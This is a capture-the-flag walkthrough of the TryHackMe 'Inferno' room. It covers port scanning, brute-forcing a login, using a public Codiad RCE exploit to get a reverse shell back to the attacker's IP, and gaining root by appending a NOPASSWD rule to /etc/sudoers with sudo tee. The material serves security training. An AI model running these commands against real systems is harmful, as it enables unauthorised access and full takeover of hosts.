# Inferno TryHackMe Writeup

>Room link : https://tryhackme.com/room/inferno


![](images/BoxImage.png)






































### Pathway

In this room first we bruteforce http login , then we find a public rce exploit and gain foothold and then with the help of a hidden file we gain user acccess. Then with sudo rights we gain root access.


## __First Stage : Enumeration__

Let's start with nmap scan.


```
# Nmap 7.91 scan initiated Fri Feb 19 21:53:19 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.190.142
Nmap scan report for 10.10.190.142
Host is up, received syn-ack (0.15s latency).
Scanned at 2021-02-19 21:53:19 IST for 2286s
Not shown: 65445 closed ports
Reason: 65445 conn-refused
PORT      STATE SERVICE           REASON  VERSION
21/tcp    open  ftp?              syn-ack
22/tcp    open  ssh               syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBR1uDh8+UHIoUl3J5AJApSgrmxFtvWtauxjTLxH9B5s9E0SThz3fljXo7uSL+2hjphfHyqrdAxoCGQJgRn/o5xGDSpoSoORBIxv1LVaZJlt/eIEhjDP48NP9l/wTRki9zZl5sNVyyyy/lobAj6BYH+dU3g++2su9Wcl0wmFChG5B2Kjrd9VSr6TC0XJpGfQxu+xJy29XtoTzKEiZCoLz3mZT7UqwsSgk38aZjEMKP9QDc0oa5v4JmKy4ikaR90CAcey9uIq8YQtSj+US7hteruG/HLo1AmOn9U3JAsVTd4vI1kp+Uu2vWLaWWjhfPqvbKEV/fravKSPd0EQJmg1eJ
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKFhVdH50NAu45yKvSeeMqyvWl1aCZ1wyrHw2MzGY5DVosjZf/rUzrdDRS0u9QoIO4MpQAvEi7w7YG7zajosRN8=
|   256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdzynTIlsSkYKaqfCAdSx5J2nfdoWFw1FcpKFIF8LRv
23/tcp    open  telnet?           syn-ack
25/tcp    open  smtp?             syn-ack
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open  kerberos-sec?     syn-ack
106/tcp   open  pop3pw?           syn-ack
110/tcp   open  pop3?             syn-ack
194/tcp   open  irc?              syn-ack
|_irc-info: Unable to open connection
389/tcp   open  ldap?             syn-ack
443/tcp   open  https?            syn-ack
464/tcp   open  kpasswd5?         syn-ack
636/tcp   open  ldapssl?          syn-ack
750/tcp   open  kerberos?         syn-ack
775/tcp   open  entomb?           syn-ack
777/tcp   open  multiling-http?   syn-ack
779/tcp   open  unknown           syn-ack
783/tcp   open  spamassassin?     syn-ack
808/tcp   open  ccproxy-http?     syn-ack
873/tcp   open  rsync?            syn-ack
1001/tcp  open  webpush?          syn-ack
1178/tcp  open  skkserv?          syn-ack
1210/tcp  open  eoss?             syn-ack
1236/tcp  open  bvcontrol?        syn-ack
1300/tcp  open  h323hostcallsc?   syn-ack
1313/tcp  open  bmc_patroldb?     syn-ack
1314/tcp  open  pdps?             syn-ack
1529/tcp  open  support?          syn-ack
2000/tcp  open  cisco-sccp?       syn-ack
2003/tcp  open  finger?           syn-ack
|_finger: ERROR: Script execution failed (use -d to debug)
2121/tcp  open  ccproxy-ftp?      syn-ack
2150/tcp  open  dynamic3d?        syn-ack
2600/tcp  open  zebrasrv?         syn-ack
2601/tcp  open  zebra?            syn-ack
2602/tcp  open  ripd?             syn-ack
2603/tcp  open  ripngd?           syn-ack
2604/tcp  open  ospfd?            syn-ack
2605/tcp  open  bgpd?             syn-ack
2606/tcp  open  netmon?           syn-ack
2607/tcp  open  connection?       syn-ack
2608/tcp  open  wag-service?      syn-ack
2988/tcp  open  hippad?           syn-ack
2989/tcp  open  zarkov?           syn-ack
4224/tcp  open  xtell?            syn-ack
4557/tcp  open  fax?              syn-ack
4559/tcp  open  hylafax?          syn-ack
4600/tcp  open  piranha1?         syn-ack
4949/tcp  open  munin?            syn-ack
5051/tcp  open  ida-agent?        syn-ack
5052/tcp  open  ita-manager?      syn-ack
5151/tcp  open  esri_sde?         syn-ack
5354/tcp  open  mdnsresponder?    syn-ack
5355/tcp  open  llmnr?            syn-ack
5432/tcp  open  postgresql?       syn-ack
5555/tcp  open  freeciv?          syn-ack
5666/tcp  open  nrpe?             syn-ack
5667/tcp  open  unknown           syn-ack
5674/tcp  open  hyperscsi-port?   syn-ack
5675/tcp  open  v5ua?             syn-ack
5680/tcp  open  canna?            syn-ack
6346/tcp  open  gnutella?         syn-ack
6514/tcp  open  syslog-tls?       syn-ack
6566/tcp  open  sane-port?        syn-ack
6667/tcp  open  irc?              syn-ack
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?        syn-ack
8081/tcp  open  blackice-icecap?  syn-ack
|_mcafee-epo-agent: ePO Agent not found
8088/tcp  open  radan-http?       syn-ack
8990/tcp  open  http-wmap?        syn-ack
9098/tcp  open  unknown           syn-ack
9359/tcp  open  unknown           syn-ack
9418/tcp  open  git?              syn-ack
9673/tcp  open  unknown           syn-ack
10000/tcp open  snet-sensor-mgmt? syn-ack
10081/tcp open  famdc?            syn-ack
10082/tcp open  amandaidx?        syn-ack
10083/tcp open  amidxtape?        syn-ack
11201/tcp open  smsqp?            syn-ack
15345/tcp open  xpilot?           syn-ack
17001/tcp open  unknown           syn-ack
17002/tcp open  unknown           syn-ack
17003/tcp open  unknown           syn-ack
17004/tcp open  unknown           syn-ack
20011/tcp open  unknown           syn-ack
20012/tcp open  ss-idi-disc?      syn-ack
24554/tcp open  binkp?            syn-ack
27374/tcp open  subseven?         syn-ack
30865/tcp open  unknown           syn-ack
57000/tcp open  unknown           syn-ack
60177/tcp open  unknown           syn-ack
60179/tcp open  unknown           syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Since there are too many open ports , I started with port 80.




![](images/port80.png)

So let's use gobuster to find directories.


```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.175.108/
[+] Threads:        50
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js,txt,html,php,json
[+] Timeout:        10s
===============================================================
2021/02/18 16:50:00 Starting gobuster
===============================================================
/index.html (Status: 200)
/inferno (Status: 401)
```

## __Second Stage : Initial access as www-data__

Hence we found the directory inferno , I visited it but it was protected with Basic Authentication . Hence I had a doubt on the image which was present in the home page , I downloaded it but found nothing.

I tried enumerating smtp , ftp and other ports but nothing interesting came.


Hence I tried bruteforcing the login using hydra.


So I created a user list .


![](images/users.png)

Using hydra I bruteforced.


![](images/hydra.png)



So if we login  we can see another login page.



![](images/login1.png)




I used the same username and pass , it worked.


![](images/ide.png)


Hence this is the web server which is running . I tried editing php files for reverse shell , but we don't have write permissions. Hence I the name of this IDE was in the title which is **Codiad**.


I searched for public exploits and found this RCE exploit.

Exploit link : https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit


I cloned it and used the program .


>  python exploit.py http://admin:dante1@10.10.4.111/inferno/  admin dante1 \<your-ip> 1234 linux


![](images/exploit.png)



Follow the commands given in that exploit and execute it. 

We get reverse shell.

For some reason the shell was not stable and I was losing connection , hence follow these steps.


![](images/www-data.png)



## __Third Stage : www-data to dante__


In the downloads directory there was a hidden file called **.download.dat**


![](images/down.png)



I used  CyberChef to decode and we get the password.

![](images/sshpass.png)



So now we can ssh into the machine and get flag.


![](images/dante.png)



For some reason the ssh connection was getting lost. So type /bin/sh or sh to get a stable shell.


## __Fourth Stage : dante to root__


So  I tried sudo -l.

![](images/perm.png)


So I searched this in [GTFOBins](https://gtfobins.github.io/) and got this.



```
LFILE=file_to_write
echo DATA | sudo tee -a "$LFILE"
```

So for exploit we do this 

```
LFILE=/etc/sudoers
echo "dante  ALL=(ALL) NOPASSWD:ALL" | sudo tee -a "$LFILE"
```

This gives user dante the permission to execute anything without password.


![](images/root.png)



Hence we rooted!.



